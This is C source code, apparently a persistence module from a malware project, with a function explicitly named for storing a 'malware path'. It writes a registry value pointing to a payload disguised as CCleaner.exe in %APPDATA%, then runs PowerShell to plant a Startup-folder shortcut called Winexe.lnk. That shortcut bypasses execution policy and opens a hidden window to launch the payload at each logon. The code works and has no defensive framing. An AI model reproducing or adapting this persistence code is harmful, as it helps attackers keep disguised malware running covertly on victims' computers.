#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "persist.h"

BOOL CreateSubKeyWithMalwarePath(void) {
    HKEY hKey = NULL;
    LPCSTR subKey = "Software\\STD";
    LPCSTR valueName = "DDD";

    // should be "%APPDATA%\\CCleaner.exe"
    LPCSTR filePath[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\CCleaner.exe", filePath, MAX_PATH);
    LONG result;

    // Create or open the registry key
    result = RegCreateKeyExA(
        HKEY_CURRENT_USER,       // HKCU
        subKey,                  // Subkey path
        0,                       // Reserved
        NULL,                    // Class type (not needed)
        REG_OPTION_NON_VOLATILE, // Store in registry permanently
        KEY_WRITE,               // We need write access
        NULL,                    // Security attributes
        &hKey,                   // Handle to the opened key
        NULL                     // Disposition (created/existed)
    );

    if (result != ERROR_SUCCESS) {
        //printf("Failed to create/open registry key. Error: %ld\n", result);
        return FALSE;
    }

    // Set the DDD value with the file path
    // strlen(filePath) + 1 includes the null terminator
    result = RegSetValueExA(
        hKey,                   // Handle to the key
        valueName,              // Value name
        0,                      // Reserved
        REG_SZ,                 // String type
        (const BYTE*)filePath,  // The data (file path)
        (DWORD) strlen(filePath) + 1    // Size including null terminator
    );

    if (result != ERROR_SUCCESS) {
        //printf("Failed to set registry value. Error: %ld\n", result);
        RegCloseKey(hKey);
        return FALSE;
    }

    //printf("Successfully created HKCU\\Software\\STD with value DDD=\"%s\"\n", filePath);

    // Close the registry key handle
    RegCloseKey(hKey);

    

	return TRUE;
}

BOOL CreateLnkShortcut(void){

    /*
    char lnkPath[MAX_PATH];
    ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winexe.lnk", lnkPath, MAX_PATH);
    printf("[+] LNK PATH -> %s lnkPath\n",lnkPath);
    */

    char lnkPath[] = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Winexe.lnk";
    char psCmd[512];
    snprintf(psCmd, sizeof(psCmd),
        "powershell -Command \""
        "$WshShell = New-Object -ComObject WScript.Shell; "
        "$shortcut = $WshShell.CreateShortcut('%s'); "
        "$shortcut.TargetPath = 'powershell.exe'; "
        "$shortcut.Arguments = '-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Start-Process -FilePath (Get-ItemProperty ''HKCU:\\Software\\STD'').DDD\"'; "
        "$shortcut.WorkingDirectory = 'C:\\\\Windows\\\\System32'; "
        "$shortcut.WindowStyle = 7; "  
        "$shortcut.Save()\"",
        lnkPath);

    if (system(psCmd) != 0) { /*printf("[x] Couldn't Create Winexe.lnk\n");*/ return FALSE; }

   // printf("[+] Created Winexe.lnk shortcut!\n");
    return TRUE;
}

